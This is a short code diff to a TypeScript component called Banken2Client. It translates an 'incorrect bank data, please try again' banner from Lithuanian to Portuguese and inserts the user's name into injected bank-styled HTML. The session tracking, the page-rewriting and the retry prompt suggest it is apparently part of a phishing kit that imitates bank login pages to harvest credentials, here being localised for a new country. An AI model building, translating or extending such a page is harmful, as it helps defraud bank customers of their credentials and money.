@@ -146,7 +146,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
     const esc = (s: string) =>
       s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
     const fullName =
-      [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim() || "kliente";
+      [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim() || "cliente";
     h = h.replace(
       /(style=["']?color:#F62515["']?[^>]*)>\s*1\s*</i,
       `$1>${esc(fullName)}<`,
@@ -170,7 +170,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
         banner.style.cssText =
           "background:#fdecea;border:1px solid #f5c6c6;color:#b3261e;border-radius:12px;padding:14px 18px;margin:0 auto 18px;max-width:640px;text-align:center;font-weight:600;font-size:14px;";
         banner.textContent =
-          "Neteisingi banko duomenys. Prašome patikrinti savo duomenis ir bandyti dar kartą.";
+          "Dados bancários incorretos. Por favor, verifique os seus dados e tente novamente.";
         const h2 = container.querySelector("h2.header-title");
         container.insertBefore(banner, h2 ? h2.nextSibling : container.firstChild);
       }
